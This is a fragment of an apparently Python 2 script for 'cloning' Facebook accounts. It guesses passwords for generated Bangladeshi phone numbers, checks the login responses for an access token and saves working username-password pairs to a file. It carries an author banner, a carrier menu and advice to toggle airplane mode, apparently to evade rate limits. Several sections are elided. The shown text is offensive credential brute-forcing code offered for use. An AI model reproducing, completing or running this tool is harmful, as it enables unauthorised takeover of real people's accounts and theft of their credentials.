...
os.system('clear')
psb('\x1b[1;32mBANGLADESH OVI 11 DIGIT CLONING START PLEASE WAIT ..........')
for n in range(9999):
...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : OVI VAI'
    print 'FACEBOOK : MD Moushfik'
    print 'GITHUB     : cyberovi420'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
...
def action():
    ...
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Please wait, process is running Please Airplane Mood on in 10 second  ...')
    time.sleep(0.5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Ovi-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[Ovi-OKY]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 24-HOURS]\x1b[0m \n'
